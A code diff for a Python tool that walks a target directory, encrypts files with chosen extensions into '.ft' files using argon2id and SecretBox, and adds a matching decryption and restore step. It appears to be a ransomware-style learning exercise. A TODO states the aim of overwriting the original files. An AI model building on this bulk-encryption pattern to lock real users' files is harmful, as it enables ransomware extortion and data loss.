@@ -3,10 +3,10 @@ import os
 import stat
 import glob
 import hashlib
-import nacl as na
 from nacl.secret import SecretBox
 from nacl.pwhash import argon2id
 from nacl.utils import random
+from nacl.exceptions import CryptoError
 
 def error(error_message:str):
     print("Error: " + error_message)
@@ -16,10 +16,63 @@ def isreadable(filepath):
     st = os.stat(filepath)
     return bool(st.st_mode & stat.S_IRUSR)
 
+def decryption(filepath, key):
+    with open(filepath, "rb") as f:
+        blob = f.read()
+
+    offset = 0
+
+    # Read extension length
+    ext_len = blob[offset]
+    offset += 1
+
+    # Read extension
+    ext = blob[offset:offset + ext_len].decode("utf-8")
+    offset += ext_len
+
+    # Read salt
+    salt_size = argon2id.SALTBYTES
+    salt = blob[offset:offset + salt_size]
+    offset += salt_size
+
+    # Encrypted payload (nonce + ciphertext + MAC)
+    encrypted = blob[offset:]
+
+    # Derive key
+    derived_key = argon2id.kdf(
+        SecretBox.KEY_SIZE,
+        key,
+        salt,
+        opslimit=argon2id.OPSLIMIT_MODERATE,
+        memlimit=argon2id.MEMLIMIT_MODERATE,
+    )
+
+    box = SecretBox(derived_key)
+
+    try:
+        data = box.decrypt(encrypted)
+    except CryptoError:
+        raise ValueError("Invalid key or corrupted file")
+
+    # Restore original filename
+    base, _ = os.path.splitext(filepath)
+    output_path = base + ext
+
+    with open(output_path, "wb") as f:
+        f.write(data)
+
+    return output_path
+
 def encryption(filepath, key):
     # Lire le fichier à chiffrer
     with open(filepath, "rb") as f:
         data = f.read()
+
+    # Construction du nouveau nom de fichier
+    base, ext = os.path.splitext(filepath)
+    output_path = base + ".ft"
+
+    ext_bytes = ext.encode("utf-8")
 
     # Générer un salt
     salt = random(argon2id.SALTBYTES)
@@ -36,15 +89,11 @@ def encryption(filepath, key):
     box = SecretBox(derived_key)
     encrypted = box.encrypt(data)
 
-    # Construction du nouveau nom de fichier
-    if filepath.endswith(".ft"):
-        output_path = filepath
-    else:
-        base, _ = os.path.splitext(filepath)
-        output_path = base + ".ft"
-
-    # Écriture : [salt][nonce + ciphertext + MAC]
+#TODO: should rewrite the file not create a new one
+    # ecriture : [salt][nonce + ciphertext + MAC]
     with open(output_path, "wb") as f:
+        f.write(bytes([len(ext_bytes)]))
+        f.write(ext_bytes)
         f.write(salt)
         f.write(encrypted)
 
@@ -85,10 +134,15 @@ extensions.append(".ft")
 # ---------------glob recursive files retriever---------------#
 
 files = []
+crypted = []
 for ext in extensions:
     pattern = os.path.join(target_dir, "**", f"*{ext}")
     files.extend(glob.glob(pattern, recursive=True))
 
 for filepath in files:
     print(filepath)
-    encryption(filepath, key)
+    crypted.extend(encryption(filepath, key))
+
+for filepath in crypted:
+    restore = decryption(filepath, key)
+    print(filepath + " was restored to " + restore)
